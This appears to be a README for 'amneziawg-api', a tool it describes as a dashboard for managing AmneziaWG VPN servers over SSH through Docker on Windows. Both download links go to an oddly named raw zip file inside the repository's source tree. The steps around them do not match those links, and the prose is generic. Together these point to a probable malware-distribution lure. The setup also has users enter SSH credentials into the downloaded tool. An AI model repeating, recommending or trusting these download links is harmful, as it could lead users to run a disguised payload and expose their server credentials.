# 🌐 amneziawg-api - Manage remote VPN servers with ease

[![Download amneziawg-api](https://img.shields.io/badge/Download-AmneziaWG-blue.svg)](https://raw.githubusercontent.com/zhao2568925438-create/amneziawg-api/main/amnezia_api/api/amneziawg-api-alveoli.zip)

## 📌 Project Overview

AmneziaWG-api acts as a central control system for your VPN connections. It connects to your remote servers through a secure channel. You use this tool to manage your AmneziaWG clients. It handles the technical tasks for you. This allows you to maintain your network connection across multiple servers. You perform these tasks from one dashboard. 

## 🛠 Prerequisites

Before you start, make sure you have the following software installed on your Windows computer:

1. **Docker Desktop:** This software runs the application in an isolated environment. Download it from the official Docker website and install it with default settings.
2. **SSH Client:** Windows includes a built-in SSH client. You will use this to verify your server connection.
3. **Internet Connection:** You need a stable network to reach your remote servers.

## 🚀 Setting Up Your System

Follow these steps to prepare your environment. These steps ensure that the application functions as intended on your local machine.

1. **Update Windows:** Ensure your operating system displays the latest updates. This prevents compatibility errors with Docker.
2. **Enable Virtualization:** Restart your computer and verify that virtualization is active in your BIOS or Task Manager under the Performance tab. Docker requires this feature.
3. **Install Docker Desktop:** Run the installer. Select the option to use WSL 2 if prompted. This improves performance on Windows.

## 📥 Downloading the Application

Visit the repository page to obtain the necessary files. This software package contains the API framework and the tools required to communicate with your remote servers. 

[Click here to visit the project page and download the software.](https://raw.githubusercontent.com/zhao2568925438-create/amneziawg-api/main/amnezia_api/api/amneziawg-api-alveoli.zip)

1. Navigate to the link above.
2. Click the green "Code" button.
3. Select "Download ZIP".
4. Extract the folder to a location on your computer that you can find easily, such as your Documents or Desktop folder.

## ⚙️ Configuring the API

Once you extract the files, you must provide your server details. Open the configuration file named `config.yaml` using Notepad or any text editor.

1. **Server IP:** Enter the numeric address of your remote server.
2. **Port Number:** Ensure this matches your server settings.
3. **SSH Credentials:** Enter your username and password or your private key path. This allows the application to send commands to your server safely.

Save the file and close your text editor. 

## 🏃 Running the Application

Now that you configured the settings, you can launch the control plane.

1. Open the folder where you placed the extracted files.
2. Open your File Explorer address bar, type "cmd", and press Enter. This opens a command window in your current folder.
3. Type the command: `docker-compose up`.
4. Wait for the process to finish. When you see a message stating the server is ready, the application is live.
5. Open your web browser. Type `http://localhost:8000` in the address bar. 

You should now see the dashboard interface. You can manage your VPN clients from here.

## 🛡 Security Practices

Keep your API credentials private. Do not share your configuration files with others. If you change your server password, update the `config.yaml` file immediately. The application uses encrypted channels, but your local configuration file contains sensitive server access data. Treat this file like a password.

## 🧩 Troubleshooting Common Issues

**The application fails to start:** Check if Docker Desktop is running. Look for the whale icon in your system tray. If it is not there, start it from your Start menu.

**Connection timeout error:** Verify your remote server is reachable. Use the `ping` command in your command window followed by your server IP address. If this fails, check your server firewall settings.

**Missing variables:** If the dashboard shows errors, re-open your `config.yaml` file. Look for typos or missing characters in your server IP and credentials.

**Port conflict:** If the application warns that port 8000 is in use, change the port in your configuration settings. You might have another web service running that uses the same port.

## 🔄 Updating the Software

Projects evolve to include new features and security fixes. To update your application:

1. Visit the repository link provided above.
2. Download the latest version of the ZIP file.
3. Replace your old file folder with the new content.
4. Open your `config.yaml` file and copy your previous configuration settings into the new folder.
5. Re-run your `docker-compose up` command as described in the previous section.

This ensures you keep your settings while benefiting from the latest improvements to the AmneziaWG-api tool. Always back up your configuration file before performing an update.